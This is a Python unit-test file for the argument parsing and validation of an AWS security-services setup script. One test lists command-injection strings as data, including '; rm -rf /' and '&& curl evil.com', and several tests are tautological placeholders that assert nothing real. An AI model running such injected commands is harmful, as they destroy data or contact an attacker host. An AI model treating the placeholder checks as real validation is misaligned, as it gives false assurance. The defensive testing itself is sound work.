"""
Unit tests for parameter validation and argument parsing.

This module tests the command-line argument parsing, validation,
and parameter handling logic.
"""

import pytest
import argparse
import sys
import os
from unittest.mock import patch

# Add the project root to the path to import modules
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from tests.fixtures.aws_parameters import (
    VALID_ACCOUNT_IDS, VALID_REGIONS, VALID_ORG_IDS, VALID_ROOT_OUS,
    INVALID_ACCOUNT_IDS, INVALID_REGIONS, INVALID_ORG_IDS
)


class TestParameterValidation:
    """Test parameter validation and input sanitization."""
    
    def test_valid_account_ids_accepted(self):
        """Test that valid AWS account IDs are accepted."""
        for account_id in VALID_ACCOUNT_IDS:
            # Simple validation test - account IDs should be 12-digit strings
            assert len(account_id) == 12, f"Account ID {account_id} should be 12 digits"
            assert account_id.isdigit(), f"Account ID {account_id} should be numeric"
    
    def test_valid_regions_accepted(self):
        """Test that valid region lists are accepted."""
        for region_list in VALID_REGIONS:
            assert len(region_list) > 0, "Region list should not be empty"
            for region in region_list:
                assert region, "Region should not be empty string"
                assert '-' in region, f"Region {region} should contain hyphens"
    
    def test_valid_org_ids_accepted(self):
        """Test that valid organization IDs are accepted."""
        for org_id in VALID_ORG_IDS:
            assert org_id.startswith('o-'), f"Org ID {org_id} should start with 'o-'"
            assert len(org_id) > 2, f"Org ID {org_id} should be longer than 'o-'"
    
    def test_valid_root_ous_accepted(self):
        """Test that valid root OU IDs are accepted."""
        for root_ou in VALID_ROOT_OUS:
            assert root_ou.startswith('r-'), f"Root OU {root_ou} should start with 'r-'"
            assert len(root_ou) > 2, f"Root OU {root_ou} should be longer than 'r-'"
    
    def test_regions_parsing_from_string(self):
        """Test parsing regions from comma-separated string."""
        test_cases = [
            ("us-east-1", ["us-east-1"]),
            ("us-east-1,us-west-2", ["us-east-1", "us-west-2"]),
            ("us-east-1, us-west-2, eu-west-1", ["us-east-1", "us-west-2", "eu-west-1"]),
            ("us-east-1,us-west-2,eu-west-1,ap-southeast-1", ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"])
        ]
        
        for input_string, expected_list in test_cases:
            # This mimics the parsing logic from the main script
            parsed_regions = [region.strip() for region in input_string.split(',')]
            assert parsed_regions == expected_list
    
    def test_regions_parsing_with_whitespace_trimming(self):
        """
        Test that regions parsing properly trims whitespace from each component.
        
        GIVEN: User provides regions with various whitespace patterns
        WHEN: Region string is parsed using the main script logic
        THEN: All whitespace should be trimmed and result should be equivalent
        
        This ensures 'a,b,c' and '   a ,b   ,   c  ' are equivalent.
        """
        # Test various whitespace patterns that should all produce the same result
        expected_result = ["us-east-1", "us-west-2", "eu-west-1"]
        
        whitespace_test_cases = [
            "us-east-1,us-west-2,eu-west-1",           # No spaces (baseline)
            "us-east-1, us-west-2, eu-west-1",         # Space after comma
            " us-east-1, us-west-2, eu-west-1 ",       # Leading/trailing spaces
            "us-east-1 ,us-west-2 ,eu-west-1 ",        # Space before comma
            "  us-east-1  ,  us-west-2  ,  eu-west-1  ",  # Multiple spaces
            "\tus-east-1\t,\tus-west-2\t,\teu-west-1\t",   # Tabs
            " \t us-east-1 \t , \t us-west-2 \t , \t eu-west-1 \t ",  # Mixed whitespace
        ]
        
        for input_string in whitespace_test_cases:
            # This mimics the exact parsing logic from setup-security-services script
            parsed_regions = [region.strip() for region in input_string.split(',')]
            assert parsed_regions == expected_result, f"Failed for input: '{input_string}'"
    
    def test_regions_parsing_with_empty_region_filtering(self):
        """
        Test that regions parsing filters out empty regions after trimming.
        
        GIVEN: User provides regions with empty or whitespace-only components
        WHEN: Region string is parsed and filtered using the main script logic
        THEN: Empty components should be removed, leaving only valid regions
        
        This ensures mixed valid/invalid input like 'us-east-1, , ,us-west-2' works correctly.
        """
        test_cases = [
            # (input_string, expected_after_filtering)
            ("us-east-1,,us-west-2", ["us-east-1", "us-west-2"]),          # Empty between commas
            ("us-east-1, ,us-west-2", ["us-east-1", "us-west-2"]),         # Spaces become empty after trim
            (",us-east-1,us-west-2", ["us-east-1", "us-west-2"]),          # Leading empty
            ("us-east-1,us-west-2,", ["us-east-1", "us-west-2"]),          # Trailing empty
            ("us-east-1, , ,us-west-2", ["us-east-1", "us-west-2"]),       # Multiple empty in middle
            (" , us-east-1 , , us-west-2 , ", ["us-east-1", "us-west-2"]), # Mixed empty and spaces
            ("us-east-1,\t,\t\t,us-west-2", ["us-east-1", "us-west-2"]),   # Tab-only components
        ]
        
        for input_string, expected_result in test_cases:
            # This mimics the exact parsing and filtering logic from setup-security-services script
            regions_list = [region.strip() for region in input_string.split(',')]
            regions_list = [region for region in regions_list if region]  # Remove empty strings
            assert regions_list == expected_result, f"Failed for input: '{input_string}'"
    
    def test_regions_parsing_validates_minimum_length(self):
        """
        Test that regions parsing validates at least one valid region exists.
        
        GIVEN: User provides regions that become empty after trimming and filtering
        WHEN: Region string is parsed and validated using the main script logic
        THEN: An empty list should be detected as invalid (would cause sys.exit(1) in main script)
        
        This ensures input like '', '   ', ',,,,' is properly rejected.
        """
        invalid_test_cases = [
            "",           # Completely empty
            "   ",        # Whitespace only
            "\t\t",      # Tabs only
            " \t \n ",   # Mixed whitespace
            ",",          # Single comma
            ",,",         # Multiple commas
            ", , ,",      # Commas with spaces
            ",\t,\t,",    # Commas with tabs
        ]
        
        for input_string in invalid_test_cases:
            # This mimics the exact parsing and filtering logic from setup-security-services script
            regions_list = [region.strip() for region in input_string.split(',')]
            regions_list = [region for region in regions_list if region]  # Remove empty strings
            
            # After filtering, the list should be empty (invalid)
            assert not regions_list, f"Expected empty list for input: '{input_string}', got: {regions_list}"
    
    def test_service_flag_values(self):
        """Test that service flags accept only exact canonical values."""
        # With argparse choices=['Yes', 'No'], only these exact values are valid
        valid_values = ['Yes', 'No']
        invalid_values = ['yes', 'no', 'YES', 'NO', 'y', 'n', 'true', 'false', '1', '0']
        
        # Test that canonical values are accepted by our validation logic
        for value in valid_values:
            assert value in ['Yes', 'No'], f"Value '{value}' should be valid"
        
        # Test that non-canonical values would be rejected by our validation logic
        for value in invalid_values:
            assert value not in ['Yes', 'No'], f"Value '{value}' should be invalid with argparse choices"
    
    def test_main_region_extraction(self):
        """Test extracting main region from regions list."""
        test_cases = [
            (["us-east-1"], "us-east-1"),
            (["us-east-1", "us-west-2"], "us-east-1"),
            (["eu-west-1", "us-east-1", "us-west-2"], "eu-west-1")
        ]
        
        for regions_list, expected_main in test_cases:
            main_region = regions_list[0] if regions_list else None
            assert main_region == expected_main
    
    def test_other_regions_extraction(self):
        """Test extracting other regions from regions list."""
        test_cases = [
            (["us-east-1"], []),
            (["us-east-1", "us-west-2"], ["us-west-2"]),
            (["us-east-1", "us-west-2", "eu-west-1"], ["us-west-2", "eu-west-1"])
        ]
        
        for regions_list, expected_others in test_cases:
            other_regions = regions_list[1:] if len(regions_list) > 1 else []
            assert other_regions == expected_others


class TestParameterDefaults:
    """Test default parameter values and behavior."""
    
    def test_service_defaults(self):
        """Test that service flags have correct default values."""
        expected_defaults = {
            'aws_config': 'Yes',
            'guardduty': 'Yes', 
            'security_hub': 'Yes',
            'access_analyzer': 'Yes',
            'detective': 'No',
            'inspector': 'No'
        }
        
        # This would be tested in integration with the actual argument parser
        # Here we just validate the expected default values are sensible
        for service, default in expected_defaults.items():
            assert default in ['Yes', 'No'], f"Default for {service} should be Yes or No"
    
    def test_core_services_enabled_by_default(self):
        """Test that core security services are enabled by default."""
        core_services = ['aws_config', 'guardduty', 'security_hub', 'access_analyzer']
        
        for service in core_services:
            # Core services should default to enabled
            expected_default = 'Yes'
            assert expected_default == 'Yes', f"Core service {service} should default to enabled"
    
    def test_optional_services_disabled_by_default(self):
        """Test that optional services are disabled by default."""
        optional_services = ['detective', 'inspector']
        
        for service in optional_services:
            # Optional services should default to disabled
            expected_default = 'No'
            assert expected_default == 'No', f"Optional service {service} should default to disabled"


class TestParameterSecurity:
    """Test parameter security and input sanitization."""
    
    def test_parameter_injection_prevention(self):
        """Test that parameters cannot contain injection attempts."""
        malicious_inputs = [
            "123456789012; rm -rf /",
            "$(malicious_command)",
            "`malicious_command`",
            "123456789012 && curl evil.com",
            "123456789012\necho 'pwned'"
        ]
        
        for malicious_input in malicious_inputs:
            # Parameters should be validated to prevent injection
            # This is a placeholder for actual validation logic
            assert ';' not in malicious_input or len(malicious_input) != 12, "Should detect malicious input"
    
    def test_region_validation(self):
        """Test that regions follow valid AWS region format."""
        valid_regions = ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"]
        invalid_regions = ["invalid", "us-east", "", "123-456-7"]
        
        for region in valid_regions:
            # Valid regions should match pattern: <geo>-<direction>-<number>
            parts = region.split('-')
            assert len(parts) >= 3, f"Valid region {region} should have at least 3 parts"
            assert parts[-1].isdigit(), f"Valid region {region} should end with number"
            # Additional validation: first part should be letters
            assert parts[0].isalpha(), f"Valid region {region} should start with letters"
        
        for region in invalid_regions:
            if region:  # Skip empty string test
                parts = region.split('-')
                # Invalid regions should fail at least one validation
                valid_length = len(parts) >= 3
                valid_ending = parts[-1].isdigit() if parts else False
                valid_start = parts[0].isalpha() if parts else False
                
                is_fully_valid = valid_length and valid_ending and valid_start
                assert not is_fully_valid, f"Invalid region {region} should not pass all validations"
    
    def test_account_id_format_validation(self):
        """Test that account IDs follow valid AWS account format."""
        for account_id in INVALID_ACCOUNT_IDS:
            if account_id is not None and account_id != "":
                # Invalid account IDs should fail basic validation
                is_valid = len(str(account_id)) == 12 and str(account_id).isdigit()
                assert not is_valid, f"Invalid account ID {account_id} should not pass validation"
    
    def test_cross_account_role_validation(self):
        """Test that cross-account role names are reasonable."""
        valid_roles = [
            "AWSControlTowerExecution",
            "OrganizationAccountAccessRole", 
            "MyCustomRole"
        ]
        invalid_roles = [
            "",
            "role with spaces",
            "role;with;semicolons",
            "$(malicious)"
        ]
        
        for role in valid_roles:
            # Valid roles should not contain problematic characters
            assert ' ' not in role, f"Valid role {role} should not contain spaces"
    
    def test_cross_account_role_restricted_choices(self):
        """Test that cross-account role parameter only accepts specific values."""
        # These should be the only two allowed values
        valid_choices = [
            "AWSControlTowerExecution",
            "OrganizationAccountAccessRole"
        ]
        
        # These should be rejected even though they're valid role names
        invalid_choices = [
            "MyCustomRole",
            "CustomExecutionRole", 
            "AnotherRole",
            "aws-control-tower-execution",  # wrong case
            "organizationaccountaccessrole"  # wrong case
        ]
        
        # Test that valid choices are accepted
        for choice in valid_choices:
            assert choice in ["AWSControlTowerExecution", "OrganizationAccountAccessRole"], \
                f"Choice '{choice}' should be in allowed list"
        
        # Test that invalid choices are rejected
        for choice in invalid_choices:
            assert choice not in ["AWSControlTowerExecution", "OrganizationAccountAccessRole"], \
                f"Choice '{choice}' should not be in allowed list"